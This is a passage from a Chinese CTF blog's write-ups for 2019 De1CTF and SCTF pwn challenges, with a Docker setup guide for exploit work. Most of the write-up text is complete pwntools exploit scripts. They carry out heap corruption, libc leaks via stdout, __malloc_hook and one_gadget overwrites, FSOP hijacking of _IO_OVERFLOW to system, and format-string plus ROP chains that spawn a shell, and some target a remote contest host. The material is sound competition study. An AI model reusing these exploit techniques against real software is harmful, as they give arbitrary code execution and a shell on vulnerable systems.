'4' + ' 4' * 7) #6 0x100000 merges(p, '5' + ' 4' * 7) #7 delete(p, 4) delete(p, 5) merges(p, '6' + ' 6' * 7) #4 0x800000 merges(p, '7' + ' 6' * 7) #5 delete(p, 6) delete(p, 7) merges(p, '4' + ' 4' * 7) #6 0x4000000 merges(p, '5' + ' 4' * 7) #7 delete(p, 4) delete(p, 5) merges(p, '6' + ' 6' * 7) #4 0x20000000 merges(p, '7' + ' 6' * 7) #5 add(p, 0xf8, '\x61') #8 add(p, 0x400, '') #9 add(p, 0x10, '') #10 delete(p, 10) add(p, 0x68, 'a' * 0x18 + p64(0x51)) #10 add(p, 0x68, '') #11 delete(p, 9) delete(p, 0) delete(p, 2) merges(p, '4 4 4 4 4 4 4 5 8') delete(p, 11) delete(p, 10) payload = p64(0) * 3 + p64(0x21) + p64(0) * 3 + p64(0x71) + p64(libc.symbols['__malloc_hook'] - 0x13) add(p, 0x58, payload) delete(p, 1) add(p, 0x68, '') if DEBUG == 1 and lib_version == 23: add(p, 0x68, '\x00\x00\x00' + p64(libc.address + 0xf1147)) elif DEBUG == 0 or (lib_version == 24): add(p, 0x68, '\x00\x00\x00' + p64(libc.address + 0xf2519)) print hex(libc.address) print hex(heap_base) #flag&#123;458a6246278b42eef7f6a2f36cb4f830&#125; p.interactive() p.close()if __name__ == '__main__': pwn()]]></content>
      <categories>
        <category>CTF-PWN</category>
      </categories>
      <tags>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019De1CTF/magic_exit]]></title>
    <url>%2F2019%2F08%2F12%2F%E5%A4%A7%E5%9E%8B%E5%A4%8D%E7%9B%98%EF%BC%9A2019-DeLCTF%2F</url>
    <content type="text"><![CDATA[唉，好久没打比赛了，这次2019DelCTF打的让我深深地自闭，真的太菜了orz。就做出来签到题。 玩高端纯技巧的unprintable我看了一天，大致可以猜到一点思路，但还是没做出来。mimic_note队里大佬拿了三血，拟态防御之前在强网杯线上见过一次，还没搞得太懂，也没做出来。其他的要么是和web结合的，要么是内核。。。打的一脸懵逼。 题目自取：2019DelCTF Weapeon:中下端纯技巧题，pwn签到题。 程序就不分析了，大家都看得懂，因为size限制在了fastbin内，所以我们想向_IO_2_1_stdout分配chunk必须利用partial overwrite,首先想怎么获取unsortedbin的chunk，emmmm，思路有两种，一种是scanf()函数自带漏洞，其会在堆上分配chunk当作缓冲区，输入完毕后再free，所以若我们输入大数据，程序内部会进行隐藏的malloc_consolidate，把fastbin进行合并，后续就都是套路了。第二种是用uaf，进行fastbinattack，释放伪造的size在unsortedbin范围内的chunk。 exp1:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798#coding:utf-8from pwn import *path = './pwn'debug = 1attach = 0#P = ELF(path)context(os='linux',arch='amd64',timeout=1,terminal=['terminator','-x','sh','-c'])context.log_level = 'debug'if debug == 0: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote('139.180.216.34',8888)def new(size,index,content): p.recvuntil('&gt;&gt; \n') p.sendline('1') p.recvuntil('weapon: ') p.sendline(str(size)) p.recvuntil('index: ') p.sendline(str(index)) p.recvuntil('name:\n') p.send(content)def delete(index): p.recvuntil('&gt;&gt; \n') p.sendline('2') p.recvuntil('idx :') p.sendline(str(index))def upgrade(index,content): p.recvuntil('&gt;&gt; \n') p.sendline('3') p.recvuntil('idx: ') p.sendline(str(index)) p.recvuntil('content:\n') p.send(content)def pwn(): new(0x60,0,'\x00'*0x60) new(0x60,1,'\x11'*0x60) new(0x60,2,'\x22'*0x60) new(0x60,3,'\x33'*0x60) delete(0) delete(1) delete(2) p.recvuntil('&gt;&gt; \n') p.sendline('1'*0x500) new(0x60,0,'\xdd\x45') new(0x60,1,'\x11'*0x60) delete(1) delete(3) upgrade(3,'\x00') new(0x60,2,'\x22'*0x60) new(0x60,4,'\x44'*0x60) new(0x60,5,'\x00'*0x33+p64(0xfbad1800)+p64(0)*3+'\x00') p.recv(0x40) libcbase = u64(p.recv(6).ljust(8,'\x00')) - (0x7f5e758c4600-0x7f5e754ff000) log.success('libcbase = '+hex(libcbase)) target = libcbase+(0x7f41e4643b20-0x7f41e427f000)-0x33 new(0x60,0,'\x00'*0x60) delete(0) upgrade(0,p64(target)) one_gadget = [0x4526a,0x45216,0xf02a4,0xf1147] new(0x60,1,'\x00') new(0x60,2,'\x00'*0x13+p64(libcbase+one_gadget[2])) delete(2) if attach == 1: gdb.attach(p) p.interactive()while True: try: pwn() break except: p.close() if debug == 0: p = process(path) else: p = remote('139.180.216.34',8888) exp2:(来自17学长)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384from pwn import *context.log_level = 'debug'#context.terminal = ['tmux', 'split', '-h']def add(p, idx, size, content): p.sendlineafter('choice &gt;&gt; ', str(1)) p.sendlineafter('wlecome input your size of weapon: ', str(size)) p.sendlineafter('input index: ', str(idx)) p.sendafter('input your name:', content)def delete(p, idx): p.sendlineafter('choice &gt;&gt; ', str(2)) p.sendlineafter('input idx :', str(idx)) def edit(p, idx, content): p.sendlineafter('choice &gt;&gt; ', str(3)) p.sendlineafter('input idx: ', str(idx)) p.sendafter('new content:', content)def pwn(): DEBUG = 1 if DEBUG == 1: p = process('./pwn') #gdb.attach(p) else: p = remote('139.180.216.34', 8888) libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') add(p, 0, 0x60, 'sunichi'.ljust(0x58, '\x00') + p64(0x70)) add(p, 1, 0x60, 'sunichi') add(p, 2, 0x60, 'sunichi') add(p, 3, 0x60, 'sunichi') add(p, 4, 0x60, 'sunichi') add(p, 7, 0x60, 'sunichi') add(p, 8, 0x60, 'sunichi') add(p, 9, 0x60, 'sunichi') delete(p, 0) delete(p, 2) edit(p, 2, '\x60') add(p, 2, 0x60, 'sunichi') add(p, 5, 0x60, p64(0) + p64(0x70+0x71)) delete(p, 1) edit(p, 5, p64(0) + p64(0x71) + '\xdd\x25') delete(p, 0) delete(p, 3) edit(p, 3, '\x70') add(p, 3, 0x60, 'sunichi') add(p, 1, 0x60, 'sunichi') payload = '\x00\x00\x00' + 6 * p64(0) + p64(0xfbad1800) + p64(0) * 3 + '\x00' add(p, 6, 0x60, payload) p.recvuntil(p64(0xfbad1800) + p64(0) * 3) recv = p.recv(8) libc.address = u64(recv) - (0x00007ffff7dd2600 - 0x00007ffff7a0d000) delete(p, 8) edit(p, 8, p64(libc.symbols['__malloc_hook'] - 0x13)) add(p, 8, 0x60, 'sunichi') add(p, 8, 0x60, '\x00\x00\x00' + p64(libc.address + 0xf02a4)) delete(p, 9) delete(p, 9) print hex(libc.address) p.interactive() p.close()if __name__ == '__main__': pwn() unprintable:emmm，这题是pwnable.tw上的400p的printable的变式，当时就已经猜到（毕竟这么相似），但是printable也不会做orz，队里大佬也没有做过这题，但是看这题的意思是想让我们在exit()里进行大量的骚操作来控制程序执行流，唉，exit()函数一直是我觉得姿势比较多，但是又一直没深入跟一遍的函数，正好靠这次机会跟一遍几个调用链，深入才是pwn的本质与有趣之处。 si单步跟进，发现大部分的操作都是在__run_exit_handlers里实现的，在__run_exit_handlers+230处，函数通过call rdx，进入了_dl_fini函数，这里看rdx的来源，发现几乎是不具有可控性的。（可以自己跟着看一下）。 继续跟，进入_dl_fini，发现在_dl_fini+126处有一处调用，调用了一个函数指针，这里的调用存在可控性，也确实有题目出过这个点（2018HCTF-the-end，有兴趣可以看一下），我们若更改这个函数指针为one_gadget就可以劫持程序执行流，但是这一题中不行。 继续跟进，在_dl_fini+686处有一个类似的点。 我们继续跟进，到了_dl_fini+819，我们发现这里的rdx固定为0，r12来源如下图，我们又惊喜地发现，r12初始值是fini_array的地址，rbx竟然是栈上偏移位置为26的那个指针（因为我是分两次截的图，所以数值不一样），所以我们改这个指针来控制程序返回到0x4007a3，继续read，printf。（之后的exit的调用链大多就是文件方面的了，我会在下一题的2019xman夏令营的一道题来继续跟进。） 返回成功时如下： 第二次调用printf时，栈环境已经发生了变化，我们可以发现在偏移23处存放的是指向printf的返回地址的指针。 我们利用格式化字符串更改其值来继续返回到0x4007a3。之后可以无限的read，printf。再利用格式化字符串任意栈地址写，将返回地址之后的那个地址写为bss段的地址，之后的思路就是利用pop rsp劫持栈到bss段，然后rop，最后系统调用打开shell。找syscall这个gadget这个操作还是蛮骚的。。。我们调用一次puts，其实际上没什么卵用，但是其会在bss段上（栈）残留libc地址，我们可以再利用partial overwrite来使syscall的地址出现在bss段上。 exp如下：这个exp参考了官方的和学长的，官方最后的那个gadget实在太**，自己体会：传送门 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127#coding:utf-8from pwn import *debug=1context(arch='amd64',os='linux')context.log_level='debug'context.terminal = ['terminator','-x','sh','-c']if debug == 1: p = process('./unprintable') P = ELF('./unprintable')else: p=remote('',)def ru(x): return p.recvuntil(x)def se(x): p.send(x)def wait(x=True): #raw_input() sleep(0.3)def write_addr(addr,sz=6): t = (stack+0x40)%0x100 v = p64(addr) for i in range(sz): if t+i != 0: se('%'+str(t+i)+'c%18$hhn%'+str(1955-t-i)+'c%23$hn\x00') else: se('%18$hhn%1955c%23$hn') wait() tv = ord(v[i]) if tv != 0: se('%'+str(tv)+'c%13$hhn%'+str(1955-tv)+'c%23$hn\x00') else: se('%13$hhn%1955c%23$hn') wait()def write_value(addr,value,addr_sz=6): write_addr(addr,addr_sz) se('%'+str(ord(value[0]))+'c%14$hhn%'+str(1955-ord(value[0]))+'c%23$hn\x00') wait() ta = p64(addr)[1] for i in range(1,len(value)): tmp = p64(addr+i)[1] if ta!=tmp: write_addr(addr+i,2) ta = tmp else: write_addr(addr+i,1) if ord(value[i]) !=0: se('%'+str(ord(value[i]))+'c%14$hhn%'+str(1955-ord(value[i]))+'c%23$hn\x00') else: se('%14$hhn%1955c%23$hn\x00') wait()part1 = 0x40082apart2 = 0x400810def call_fun(fun_addr,arg1,arg2,arg3): payload = p64(part1) payload+= p64(0) payload+= p64(1) payload+= p64(fun_addr) payload+= p64(arg3) payload+= p64(arg2) payload+= p64(arg1) payload+= p64(part2) payload+= '\x00'*0x38 return payloadbuf = 0x601060+0x100+4ru('This is your gift: ')stack = int(ru('\n'),16)-0x118if stack%0x10000 &gt; 0x2000: p.close() exit()ret_addr = stack - 0xe8log.success('ret_addr = '+hex(ret_addr))log.success('stack = '+hex(stack))se('%'+str(buf-0x600DD8)+'c%26$hn'.ljust(0x100,'\x00')+p64(0x4007A3))sleep(1)gdb.attach(p)se('%'+str(0xa3)+'c%23$hhn\x00')wait()rop = 0x601060+0x200write_value(stack,p64(rop)[:6])p_rbp = 0x400690 #0x0000000000400690: pop rbp; ret;p_rsp = 0x40082d #0x000000000040082d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; retp_rdi = 0x400833 #0x0000000000400833: pop rdi; ret;payload1 = p64(0)*2 + '/bin/sh\x00'payload1+= call_fun(P.got['read'],0,0x601800,0x800)payload1+= p64(p_rdi)+p64(0x601060)+p64(P.plt['puts'])payload1+= p64(p_rsp)+p64(0x601800-0x18)p.send(('%'+str(0x82d)+'c%23$hn').ljust(0x200,'\x00')+payload1)raw_input()payload2 = call_fun(P.got['read'],0,0x601260+0x18,1)payload2+= call_fun(P.got['read'],0,0x601060,59)payload2+= call_fun(0x601260+0x18,0x601260+0x10,0,0)p.send(payload2)raw_input()p.send('\xac')raw_input()p.send('\x00'*59)raw_input()p.sendline('/bin/sh 1&gt;&amp;2')p.interactive()p.close() 2019XMAN夏令营某道题：这题是广州大学的一个大佬给我的，我断断续续，连看之前类似的题，连向学长求助，做了一天多才调出来。。感觉还是有东西的。。。感觉像是2018bctf的three和defconchina的echos的结合版。。。 之前尝试了三种方法，fastbin_attack，chunk overlapping，伪造top_chunk_size都失败了，都是出在一个问题上：一旦mmap的地址出来以后，所有的chunk（除非极大，mmap的空间不够）都会从mmap分配和归还，所有的bins都报废了，感觉源码还是啃得不够深。。。。 这里说一下大致思路，大家跟一下exp就能很好的理解，主要想跟一下exit()。看看_IO_clean_up的调用链和_IO_flush_all_lockp的执行流。 思路：leak：我当时还被leak迷住了一会。。大脑抽了。。new，delete，new，view，即可泄露出libc和heap地址。 控制程序执行流：漏洞点在于当你申请极大size的chunk时，malloc会返回0，所以chunk_ptr+size-1=0这条指令就相当于任意大地址（size-1）写0字节，且次数不限。这里选用的是改top_chunk_addr（main_arena+88）的最后一个字节为0，使其变为我们伪造的size（注意，这个size是我们精心伪造的），但是之前说了之后的bins会全部废掉，所以我们只能分配极大chunk，让其从topcchunk里分配，因为mmap分配的chunk对我们来说没有任何价值。且我们只有一次机会（之后若再分配极大chunk会到没有权限的地址上），所以思路是利用这一次分配劫持程序执行流。 又看到程序的4选项是调用exit()，所以想到可能与文件结构体有关，所以想到利用_IO_flush_all_lockp来劫持程序执行流。篡改stdout或stderr或stdin文件结构体的chain位为我们在堆上伪造的_IO_FILE，再调用_IO_overflow时伪造为调用system。这里跟一下最后的过程： 跟进exit：来具体调试看一下exit是怎么调用的这个函数： 接着上面的unprintable继续跟进，我们发现程序走出了_dl_fini，返回了__run_exit_handlers，继续跟进，在__run_exit_handlers+136处调用了_IO_cleanup。 继续单步进入_IO_cleanup，发现在_IO_cleanup+36处调用了_IO_flush_all_lockp。 在这里我们先来看一下_IO_flush_all_lockp的源码来搞清他的基本逻辑，汇编可读性还是太差。 _IO_flush_all_lockp的源码如下： 12345678910111213141516171819202122232425262728293031323334int _IO_flush_all_lockp (int do_lock)&#123;...... last_stamp = _IO_list_all_stamp; fp = (_IO_FILE *) _IO_list_all; //_IO_list_all赋给fp while (fp != NULL) &#123;...... if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)//需要bypass的条件#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T || (_IO_vtable_offset (fp) == 0 &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base))//需要bypass的条件#endif ) &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)//改 _IO_OVERFLOW 为 system 劫持程序流！ result = EOF; if (do_lock) _IO_funlockfile (fp); run_fp = NULL; if (last_stamp != _IO_list_all_stamp) &#123; /* Something was added to the list. Start all over again. */ fp = (_IO_FILE *) _IO_list_all; last_stamp = _IO_list_all_stamp; &#125; else fp = fp-&gt;_chain; //我们篡改stderr的chain为heap，劫持下一个fp到伪造的_IO_FILE &#125;......&#125; 由于逻辑短路原则，想要调用后面的_IO_OVERFLOW (fp, EOF)，前面的条件必须满足，即： 1234561.fp-&gt;_mode &lt;= 02.fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base或1._IO_vtable_offset (fp) == 02.fp-&gt;_mode &gt; 03.fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base （我这里用的第一种。。。） 这个函数的基本逻辑就是先从_IO_list_all开始，逐个清理_IO_FILE，若是满足上面的条件之一的就会调用vtable里的_IO_OVERFLOW函数来清理残留的缓冲区等内存空间。然后通过chain位寻找下一个_IO_FILE，直到chain为0为止。 在一个正常的程序里，_IO_FILE的连接顺序是_IO_list_all=&gt;_IO_2_1_stderr=&gt;_IO_2_1_stdout=&gt;_IO_2_1_stdin=&gt;0。我们的思路是把_IO_2_1stderr的chain伪造为heap上的fake_IO_FILE，下图为已经篡改好的，本来0x5630fa2b2011位置的值应该是_IO_2_1_stdout的首地址。 看一眼heap上的伪造的_IO_FILE： 我们继续跟进，因为正常的_IO_FILE是不会有_IO_OVERFLOW的调用过程的，所以跳的还是蛮快的。在_IO_flush_all_lockp+356位置，我们看到已经开始准备参数了，此时rbx里装的是fake_IO_FILE的首地址，执行完这条指令之后，rax里装的就是fake_vtable的值了。 之后终于在_IO_flush_all_lockp+371处调用了_IO_OVERFLOW，因为他是根据vtable的偏移来找的，所以直接会调用system。参数又是addr_/bin/sh，所以直接get shell！！！ exp如下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091#coding:utf-8from pwn import *path = './pwn2'debug = 1attach = 0#P = ELF(path)context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c'])context.log_level = 'debug'if debug == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote()def new(index,size,content): p.recvuntil('choice: ') p.sendline('1') p.recvuntil('index: ') p.sendline(str(index)) p.recvuntil('size: ') p.sendline(str(size)) p.recvuntil('info: ') p.send(content)def delete(index): p.recvuntil('choice: ') p.sendline('3') p.recvuntil('index: ') p.sendline(str(index))def view(index): p.recvuntil('choice: ') p.sendline('2') p.recvuntil('index: ') p.sendline(str(index))new(0,0x520,'\x11'*0x30)new(1,0x100,'\x22'*0x30)delete(0)new(2,0x100,'\x00'*8)new(0,0x400,'\x11'*8)view(0)p.recvuntil('\x11'*8)libcbase = u64(p.recv(6).ljust(8,'\x00')) libcbase = libcbase-(0x7f8683ad4f68-0x7f8683710000)log.success('libcbase = '+hex(libcbase))libc.address = libcbasep.recvuntil('\x00'*2)heap_addr = u64(p.recv(6).ljust(8,'\x00')) - 0x70 - 0xa0log.success('heap_addr = '+hex(heap_addr))delete(0)delete(1)delete(2)target_value = heap_addr + 0x10target_addr = libc.address + 0x3c55a0top_chunk_addr = heap_addr + 0x200offset = (target_value) + (target_addr -0x10 - top_chunk_addr) + 0x10 log.success('target_addr = '+hex(target_addr))log.success('target_value'+hex(target_value))log.success('top_chunk_addr = '+hex(top_chunk_addr))log.success('offset = '+hex(offset))vtable = p64(heap_addr + 0xf0 + 1)fake_file = '/bin/sh\x00'+p64(0)*4+p64(1)fake_file += p64(0)*14 + vtable + p64(0)*3 + p64(0xffffffffffffffff)fake_file = fake_file.ljust(0xd8,'\x00')fake_file += vtable + p64(0)*3 + p64(libc.symbols['system'])*4new(0,0x200,'\x00'+fake_file+p64(0)*27+'\x00'*7+p64(offset))new(1,libcbase+(0x7f59e6fb3b20-0x7f59e6bef000)+88+1,'\x11')new(2,target_addr -0x10 - top_chunk_addr,'\x11')#gdb.attach(p)p.recvuntil('choice:')p.sendline('4')p.interactive() Mimic_note:一道拟态防御的题，我会在拟态防御专题里详细分析，先鸽了orz。 Race:内核题。。。先占个坑 babyrust:有点难orz，是cve的变种，to do。。。。。。]]></content>
      <categories>
        <category>CTF-PWN</category>
      </categories>
      <tags>
        <tag>WP</tag>
        <tag>De1CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[docker初识]]></title>
    <url>%2F2019%2F08%2F08%2Fdocker%E5%88%9D%E8%AF%86%2F</url>
    <content type="text"><![CDATA[说起来蛮丢人的，一直看大佬们做题都是用docker，而自己还一直用笨重的虚拟机，但是虚拟机又用习惯了，一直懒得整docker，直到一次线下赛19.04的ubuntu崩了，让我下定了要换docker的决心，昨天简单整了一下，在此记录一下。 docker在pwn里使用的方面我了解到的暂时主要有两个： 搭好环境，安好工具，用来做题：先从dockerhub上pull一个普通的ubuntu19.04，再run起来： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556$ docker pull ubuntu:19.04$ docker run -i -t --name create_env ubuntu:19.04 bash'''docker run：启动containerubuntu:19.04：你想要启动的image:tag-t：进入终端-i：获得一个交互式的连接，通过获取container的输入bash：在container中启动一个bash shellUsage: docker run [OPTIONS] IMAGE [COMMAND] [ARG...] 02. 03. -d, --detach=false 指定容器运行于前台还是后台，默认为false 04. -i, --interactive=false 打开STDIN，用于控制台交互，常与-t一起使用05. -t, --tty=false 分配tty设备，该可以支持终端登录，默认为false，常与-i一起使用 06. -u, --user="" 指定容器的用户 07. -a, --attach=[] 登录容器（必须是以docker run -d启动的容器） 08. -w, --workdir="" 指定容器的工作目录 09. -c, --cpu-shares=0 设置容器CPU权重，在CPU共享场景使用 10. -e, --env=[] 指定环境变量，容器中可以使用该环境变量 11. -m, --memory="" 指定容器的内存上限 12. -P, --publish-all=false 指定容器暴露的端口 13. -p, --publish=[] 指定容器暴露的端口 14. -h, --hostname="" 指定容器的主机名 15. -v, --volume=[] 给容器挂载存储卷，挂载到容器的某个目录 16. --volumes-from=[] 给容器挂载其他容器上的卷，挂载到容器的某个目录 17. --cap-add=[] 添加权限，权限清单详见：http://linux.die.net/man/7/capabilities 18. --cap-drop=[] 删除权限，权限清单详见：http://linux.die.net/man/7/capabilities 19. --cidfile="" 运行容器后，在指定文件中写入容器PID值，一种典型的监控系统用法 20. --cpuset="" 设置容器可以使用哪些CPU，此参数可以用来容器独占CPU 21. --device=[] 添加主机设备给容器，相当于设备直通 22. --dns=[] 指定容器的dns服务器 23. --dns-search=[] 指定容器的dns搜索域名，写入到容器的/etc/resolv.conf文件 24. --entrypoint="" 覆盖image的入口点 25. --env-file=[] 指定环境变量文件，文件格式为每行一个环境变量 26. --expose=[] 指定容器暴露的端口，即修改镜像的暴露端口 27. --link=[] 指定容器间的关联，使用其他容器的IP、env等信息 28. --lxc-conf=[] 指定容器的配置文件，只有在指定--exec-driver=lxc时使用 29. --name="" 指定容器名字，后续可以通过名字进行容器管理，links特性需要使用名字 30. --net="bridge" 容器网络设置: 31. bridge 使用docker daemon指定的网桥 32. host //容器使用主机的网络 33. container:NAME_or_ID &gt;//使用其他容器的网路，共享IP和PORT等网络资源 34. none 容器使用自己的网络（类似--net=bridge），但是不进行配置 35. --privileged=false 指定容器是否为特权容器，特权容器拥有所有的capabilities 36. --restart="no" 指定容器停止后的重启策略: 37. no：容器退出时不重启 38. on-failure：容器故障退出（返回值非零）时重启 39. always：容器退出时总是重启 40. --rm=false 指定容器停止后自动删除容器(不支持以docker run -d启动的容器) 41. --sig-proxy=true 设置由代理接受并处理信号，但是SIGCHLD、SIGSTOP和SIGKILL不能被代理 ''' 之后我们就进入了ubuntu19.04的docker内部，我们可以在这里装做题需要用到的工具。 当然我们需要先换源，我用的是163的源，换源的命令行： 12345678cd /etc/aptcp sources.list sources.list.bak #备份apt-get updateapt-get install vim #安装编辑器apt-get install apt-transport-https #换源之后采用https协议，需要安装该软件才行echo '' &gt; sources.list #清空原有的数据vim sources.list #放入新源数据apt-get update #更新 换源之后就可以直接运行工具安装脚本： 123456789101112131415161718#安装pwntools库apt-get install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essentialpip install pwntools#安装pwngdb和pedaapt-get install gdbgit clone https://github.com/longld/peda.git ~/pedaecho "source ~/peda/peda.py"&gt;&gt; ~/.gdbinitcd ~/git clone https://github.com/scwuaptx/Pwngdb.gitcp ~/Pwngdb/.gdbinit ~/#安装one_gadgetapt-get install rubyapt-get install gemgem install one_gadget#安装tmuxapt-get install tmux#安装ROPgadgetpip install ropgadget 正常情况下是可以一键运行脚本安装完成的，但是我在安装18.10时，在装python-dev时遇到缺失依赖的情况，解决方法如下： 123apt-get install aptitude aptitude install python-dev#之后的判断是：n y y ，不要一直无脑按回车 ( 之后可以继续正常安装。 还有需要说明的一点是，tmux算是必须要装的东西，因为docker无法弹出shell，所以gdb.attach的弹出的shell必须在当前shell分屏，需要在exp前端加上下面这行代码： 1context.terminal = ['tmux','splitw','-h'] 还有一点是在docker里进入tmux后，按CTRL+B+:，底端会出现命令行，输入set -g mouse on，这样调试页面就可以上下滑动了，不然屏幕无法滚动，调试会很不方便。 安装完成之后就可以将我们的docker提交 (commit)为我们自己的镜像 (image)： 先CTRL+D停止docker，然后用： 1docker ps -a #查看已经停止运行的docker容器 获取CONTAINER ID，然后用commit命令将容器提交为镜像： 123456docker commit -m "xxxxxx" CONTAINER ID xiaoxiaorenwu/ctf-pwn:19.04#-m为提交时的描述#xiaoxiaorenwu最好为你在dockerhub上的用户名#ctf-pwn为仓库名#19.04为tag#CONTAINER ID就是上面获取的那个 然后再docker images，我们就可以看到自己打包的镜像了。 然后我们可以将这个镜像放到dockerhub上去： 12docker logindocker push xiaoxiaorenwu/ctf-pwn:19.04 因为网速问题也可以放到阿里云的docker托管仓库，但我感觉其实都一样。。。。 想改image的名字和tag时： 1docker tag IMAGEID(镜像id) REPOSITORY:TAG（仓库：标签） 之后我们可以重新运行docker，并设置本机和docker共享的文件夹： 1docker run -i -t --privileged -v ~/pwn（本机文件夹）:/home/ctf-pwn（docker文件夹） xiaoxiaorenwu/ctf-pwn:19.04 bash 然后当我们退出时可以CTRL+D，再次启动时可以运行脚本： 12docker container start CONTAINER IDdocker exec -i -t CONTAINER ID bash 然后就可以开始调试了。。。。 这些都是基本操作，为了做题已经足够。。。真正的掌握还差太远。 打包好作为出题的环境：之前的方法：socat tcp-l:9999,fork exec:./pwn ，这种方法很不安全。 现在docker+xinted比较普遍，看雪上有文章写的比较详细：传送门1号 还有一篇博客是同时在一个docker里部署多个题目：传送门2号 docker-compose还没细看。。。。先写这么点，日后再补充。。复盘计划为重QAQ 最后附上我的docker(建议使用国内阿里云的)： 123docker pull xiaoxiaorenwu/ctf-pwn:18.04docker pull xiaoxiaorenwu/ctf-pwn:18.10docker pull xiaoxiaorenwu/ctf-pwn:19.04 1234sudo docker pull registry.cn-hangzhou.aliyuncs.com/xiaoxiaorenwu/ctf-pwn:18.04sudo docker pull registry.cn-hangzhou.aliyuncs.com/xiaoxiaorenwu/ctf-pwn:18.10sudo docker pull registry.cn-hangzhou.aliyuncs.com/xiaoxiaorenwu/ctf-pwn:19.04sudo docker pull registry.cn-hangzhou.aliyuncs.com/xiaoxiaorenwu/ctf-pwn:19.10 https://cr.console.aliyun.com/repository/cn-hangzhou/xiaoxiaorenwu/ctf-pwn/details]]></content>
      <categories>
        <category>CTF-PWN</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[2019SCTF]]></title>
    <url>%2F2019%2F08%2F07%2F%E5%A4%A7%E5%9E%8B%E5%A4%8D%E7%9B%98%EF%BC%9A2019-SCTF%2F</url>
    <content type="text"><![CDATA[这场比赛当时因为快到期末考试了，没有打，现在复盘一下，貌似大部分都是技巧题。 one_heap:中高端技巧题，一般限制次数的tcache都比较有趣就像解密一样hhhh，这题也是。 只有一个chunk位，限制了15次malloc，4次free，环境是2.27。 值得注意的一点是不会有\n这个干扰字节，也就是说你向chunk里只输入一个\n，就等于输入了空。有了这个特点可以把我们的double free变成一个无限循环圈。 leak:利用new，delete，delete，new，new，new的套路，再一次delete时，chunk就会放入unsortedbin里，获取到了main_arena+88的地址。但是因为我们有一个无限循环圈，所以此时tcache[0x90]里仍然是一个循环圈并且和unsortedbin里的chunk是一样的。然后分配一个小chunk对fd进行partial overwrite，然后分到_IO_2_1_stdout去泄露。 劫持执行流：为了泄露我们已经用了三次delete，还剩随后一次，一次delete想完成一次普通的劫持是不太可能的，所以肯定有奇妙的方法，我们再仔细想，一次delete能干啥呢？一次delete似乎只能把一个chunk放进tcache[]里，但是我们想去malloc_hook的话，必须篡改一个已经在tcache里的chunk的fd为malloc_hook，但是人人都会的double free肯定是想都不用想的，所以我们只能篡改unsortedbin里的chunk的size，然后再new一个size比原先大的chunk的时候就等效于产生了溢出，利用这个假溢出来更改一个已经放进tacahe里的chunk的fd为malloc_hook。最后进行realloc_hook微调，get shell !!` 真的感觉有时做tcache像解密一样。。。特别是限制次数的那种。 exp如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374#coding:utf-8from pwn import *path = './one_heap'debug = 1attach = 0#P = ELF(path)context(os='linux',arch='amd64')context.terminal=['tmux','splitw','-h']#context.log_level = 'debug'if debug == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote()def new(size,content): p.recvuntil('choice:') p.sendline('1') p.recvuntil('size:') p.sendline(str(size)) p.recvuntil('content:') p.send(content)def delete(): p.recvuntil('choice:') p.sendline('2')def mypwn(): new(0x7f,'\x11'*8+'\n') delete() delete() new(0x7f,'\n') new(0x7f,'\n') new(0x7f,'\n') new(0x30,p64(0)*4+p64(0x90)+'\x20'+'\n') delete() new(0x7f,'\n') delete() new(0x20,'\x60\x77\n') new(0x7f,p64(0)*4+p64(0)+p64(0x91)+'\n') new(0x7f,p64(0xfbad1800)+p64(0)*3+'\x00'+'\n') p.recv(8) libcbase = u64(p.recv(6).ljust(8,'\x00')) - (0x7f7e447088b0-0x00007f7e4431b000) log.success('libcbase = '+hex(libcbase)) new(0x68, p64(0) * 11 + p64(0x41) + p64(libcbase+libc.sym['__realloc_hook'])) one_gadget = [0x4f2c5,0x4f322,0x10a38c] new(0x30,'\n') new(0x30,p64(libcbase+one_gadget[2])+p64(libcbase+libc.sym['__libc_realloc']+4)+'\n') new(0x20,'xiaoxiaorenwu'+'\n') if attach == 1: gdb.attach(p)while True: try: mypwn() break except: p.close() p = process('./one_heap')p.interactive() 之后才看到原来上面这种解法是非预期。。。预期解太狗血了。。。爆破1/4096，爆一下午能出么。。。 预期解：利用两次delete来double free，之后想向stdout去分配chunk，但是因为heap地址和proc地址中间有三到四个字节不同，所以要爆破很久，之后就是再double free。 我不造这个预期解出的有什么意义。。 exp如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#coding:utf-8from pwn import*context.log_level = "debug"p = process("./one_heap")a = ELF("./libc-2.27.so")context.terminal = ['tmux','splitw','-h']#p = remote("47.104.89.129",10001)#gdb.attach(p)def 